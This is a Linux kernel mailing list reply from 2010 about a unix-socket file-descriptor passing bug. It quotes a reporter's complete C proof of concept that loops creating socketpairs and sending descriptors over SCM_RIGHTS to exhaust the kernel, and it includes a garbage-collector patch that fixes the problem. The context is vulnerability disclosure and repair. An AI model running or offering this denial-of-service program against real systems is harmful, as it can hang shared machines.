From: Eric Dumazet <eric.dumazet@gmail.com>
Subject: Re: Simple kernel attack using socketpair. easy, 100%
 reproductiblle, works under guest. no way to protect :(
Date: Thu, 25 Nov 2010 07:28:21 +0100
Message-ID: <1290666501.2798.84.camel@edumazet-laptop>
References: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: QUOTED-PRINTABLE
Cc: linux-kernel@vger.kernel.org, netdev <netdev@vger.kernel.org>,
	David Miller <davem@davemloft.net>
To: =?UTF-8?Q?=D0=9C=D0=B0=D1=80=D0=BA_?=
	 =?UTF-8?Q?=D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3?=
	<socketpair@gmail.com>
Return-path: <linux-kernel-owner@vger.kernel.org>
In-Reply-To: <AANLkTikCeddPFRGojPGuB6oq3xGYgovtm8r4=WhjEDpe@mail.gmail.com>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Le jeudi 25 novembre 2010 =C3=A0 10:57 +0500, =D0=9C=D0=B0=D1=80=D0=BA =
=D0=9A=D0=BE=D1=80=D0=B5=D0=BD=D0=B1=D0=B5=D1=80=D0=B3 a =C3=A9crit :
> #include <sys/socket.h>
> #include <sys/un.h>
>=20
> static int send_fd (int unix_fd, int fd)
> {
>   struct msghdr msgh;
>   struct cmsghdr *cmsg;
>   char buf[CMSG_SPACE (sizeof (fd))];
>=20
>   memset (&msgh, 0, sizeof (msgh));
>   memset (buf, 0, sizeof (buf));
>=20
>   msgh.msg_control =3D buf;
>   msgh.msg_controllen =3D sizeof (buf);
>=20
>   cmsg =3D CMSG_FIRSTHDR (&msgh);
>   cmsg->cmsg_len =3D CMSG_LEN (sizeof (fd));
>   cmsg->cmsg_level =3D SOL_SOCKET;
>   cmsg->cmsg_type =3D SCM_RIGHTS;
>=20
>   msgh.msg_controllen =3D cmsg->cmsg_len;
>=20
>   memcpy (CMSG_DATA (cmsg), &fd, sizeof (fd));
>   return sendmsg (unix_fd, &msgh, 0);
> }
>=20
>=20
> int main ()
> {
>   int fd[2], ff[2];
>   int target;
>=20
>   if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, fd)=3D=3D-1)
>     return 1;
>=20
>   for (;;)
>   {
>     if (socketpair (PF_UNIX, SOCK_SEQPACKET, 0, ff)=3D=3D-1)
>         return 2;
>     send_fd (ff[0], fd[0]);
>     send_fd (ff[0], fd[1]);
>     close (fd[1]);
>     close (fd[0]);
>     fd[0] =3D ff[0];
>     fd[1] =3D ff[1];
>   }
> }=20


Since you obviously read recent mails on this subject yesterday, why
dont you Cc netdev ?

There is a very easy way to protect against this actually.

A patch was posted yesterday, and need some adjustements.


diff --git a/net/unix/garbage.c b/net/unix/garbage.c
index c8df6fd..40df93d 100644
--- a/net/unix/garbage.c
+++ b/net/unix/garbage.c
@@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_soc=
k *u)
 }
=20
 static bool gc_in_progress =3D false;
+#define UNIX_INFLIGHT_TRIGGER_GC 2000
=20
 void wait_for_unix_gc(void)
 {
+	/*
+	 * If number of inflight sockets is insane,
+	 * force a garbage collect right now.
+	 */
+	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
+		unix_gc();
 	wait_event(unix_gc_wait, gc_in_progress =3D=3D false);
 }
=20
